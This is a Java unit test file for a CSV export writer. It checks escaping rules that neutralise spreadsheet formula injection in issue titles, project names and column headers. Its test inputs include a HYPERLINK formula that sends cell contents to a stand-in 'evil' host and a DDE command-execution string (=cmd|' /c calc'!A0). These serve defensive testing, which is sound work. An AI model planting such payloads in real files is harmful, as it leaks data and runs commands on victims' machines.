package com.hamstrack.report.csv;

import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.time.LocalDate;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The escaping rules of {@link CsvWriter}, which are the security half of R7 (HD-141).
 *
 * <p>A plain unit test on purpose. These are pure string rules, they are the ones a future edit is
 * most likely to "simplify", and every one of them has a failure mode that a report test would not
 * notice: a formula that fires in the reader's spreadsheet, a comma in a title that shifts every
 * column of a row by one, a negative number turned into text so the column stops summing.
 */
class CsvWriterTest {

    /**
     * <strong>The one that matters.</strong> A leading {@code =}, {@code +}, {@code -}, {@code @},
     * tab or CR in a <em>text</em> cell is a formula to Excel, LibreOffice and Sheets, and issue
     * titles are attacker-controlled by anyone who can create an issue in a project the victim can
     * report on. Quoting alone is not a mitigation — the CSV parser removes the quotes before the
     * formula engine sees the value — so the value is prefixed with an apostrophe as well.
     */
    @Test
    void aTextCellThatWouldBeAFormulaIsPrefixedWithAnApostrophe() {
        var csv = new CsvWriter()
                .row("=HYPERLINK(\"https://evil/\"&A1,\"Q3 plan\")")
                .row("+1 (555) 0100")
                .row("-- dropped")
                .row("@channel please look")
                .row("\tleading tab")
                .toCsv();

        assertThat(lines(csv)).containsExactly(
                "\"'=HYPERLINK(\"\"https://evil/\"\"&A1,\"\"Q3 plan\"\")\"",
                "\"'+1 (555) 0100\"",
                "\"'-- dropped\"",
                "\"'@channel please look\"",
                "\"'\tleading tab\"");
    }

    /**
     * The other half of the same rule, and the reason it is not applied everywhere: a negative
     * number legitimately starts with {@code -}, and neutralising it would turn a numeric column
     * into text — a spreadsheet whose figures will not sum, which is the "these numbers don't
     * match" failure the whole epic is organised around.
     */
    @Test
    void aNumericCellIsNeverNeutralisedAndNeverQuoted() {
        var csv = new CsvWriter()
                .row(-5L, new BigDecimal("-2.50"), -0.5d, true, LocalDate.parse("2026-08-20"))
                .toCsv();

        assertThat(lines(csv)).containsExactly("-5,-2.5,-0.5,true,2026-08-20");
    }

    @Test
    void aTextCellIsAlwaysQuotedSoACommaOrAQuoteCannotShiftTheRow() {
        var csv = new CsvWriter().row("a,b", "he said \"hi\"", "line\nbreak").toCsv();

        assertThat(csv).contains("\"a,b\",\"he said \"\"hi\"\"\",\"line\nbreak\"");
    }

    /**
     * A gap is an empty field, not the four-character string {@code null} and not {@code ""}.
     * Reports have honest gaps — a cycle time with no start, a suppressed band — and this is the
     * one spelling every spreadsheet and dataframe library reads back as missing.
     */
    @Test
    void aNullCellIsAnEmptyUnquotedField() {
        var csv = new CsvWriter().row(null, "x", null).toCsv();

        assertThat(lines(csv)).containsExactly(",\"x\",");
    }

    /**
     * A value in a comment line cannot end the line: a newline in a project name would otherwise
     * turn the remainder of the header into a data row.
     */
    @Test
    void aCommentValueIsFlattenedToOneLine() {
        var csv = new CsvWriter().comment("Project", "DEMO\r\n1,2,3").toCsv();

        assertThat(lines(csv)).containsExactly("\"# Project: DEMO  1,2,3\"");
    }

    /**
     * <strong>A comment line is ONE cell, and that is the fix for round 1's reasoning</strong>
     * (round 2, item 1).
     *
     * <p>The old javadoc held two adjacent claims: flatten newlines (sound) and "no formula guard
     * is needed, the line begins with {@code #} so the whole cell is text" (not) — the second
     * carried from the first. It is true of the FIRST cell only. An unquoted comment line is split
     * on commas like any other row, so one comma in a project or sprint name ends the {@code #}
     * cell and opens a new one that can begin with {@code =}. The test above even asserted the
     * output {@code # Project: DEMO  1,2,3}, which is three cells.
     *
     * <p>Reachable: project names are validated for invisible and reordering characters only, and
     * sprint names carry nothing but a length limit — neither restricts {@code ,} or {@code =}.
     * Comma-free payloads are the norm for this attack, so the single comma the breakout costs is
     * not a barrier, and the cells it would read from are the project id, the sprint id and the
     * report's numbers.
     */
    @Test
    void aCommaInACommentValueCannotOpenASecondCell() {
        var csv = new CsvWriter()
                .comment("Project", "Acme, =HYPERLINK(\"https://evil/\"&B1,\"ok\")")
                .note("Filters that matched nothing: labelId, =1+1")
                .toCsv();

        assertThat(lines(csv)).allSatisfy(line -> assertThat(cells(line))
                .as("a comment line must be a single cell however the value is spelled — "
                    + "otherwise a comma in a name hands the reader a live formula in the cell "
                    + "next to the project id")
                .hasSize(1));
        assertThat(lines(csv).get(0)).startsWith(CsvWriter.COMMENT_PREFIX);
        assertThat(cells(lines(csv).get(0)))
                .containsExactly("# Project: Acme, =HYPERLINK(\"https://evil/\"&B1,\"ok\")");
    }

    /**
     * Column names are quoted too. They are constants today, and the first custom-field column
     * makes one a string an admin typed.
     */
    @Test
    void theFileOpensWithAByteOrderMarkAndUsesCrlf() {
        var csv = new CsvWriter().columns(List.of("a", "b")).row(1, 2).toCsv();

        assertThat(csv).startsWith(CsvWriter.BOM);
        assertThat(csv).isEqualTo(CsvWriter.BOM + "\"a\",\"b\"\r\n1,2\r\n");
    }

    @Test
    void aColumnNameThatWouldBeAFormulaIsNeutralisedLikeAnyOtherText() {
        var csv = new CsvWriter().columns(List.of("=cmd|' /c calc'!A0", "ok, fine")).toCsv();

        assertThat(cells(lines(csv).get(0)))
                .as("a column name is a text cell: the day a report exports a custom field, this "
                    + "is a string an admin typed")
                .containsExactly("'=cmd|' /c calc'!A0", "ok, fine");
    }

    @Test
    void aUuidAnEnumAndAnInstantAreRenderedInTheirCanonicalForms() {
        var id = UUID.randomUUID();
        var csv = new CsvWriter()
                .row(id, Sample.ONE, OffsetDateTime.parse("2026-08-20T12:00:00+02:00"))
                .toCsv();

        assertThat(lines(csv)).containsExactly(id + ",ONE,2026-08-20T10:00Z");
    }

    private enum Sample { ONE }

    /** One line read back as cells — quoting respected, so a comma inside one does not split it. */
    private static List<String> cells(String line) {
        return CsvCells.of(line);
    }

    /** The file's lines without the BOM and without the empty tail after the final CRLF. */
    private static List<String> lines(String csv) {
        var parts = csv.substring(CsvWriter.BOM.length()).split("\r\n", -1);
        return List.of(parts).subList(0, parts.length - 1);
    }
}
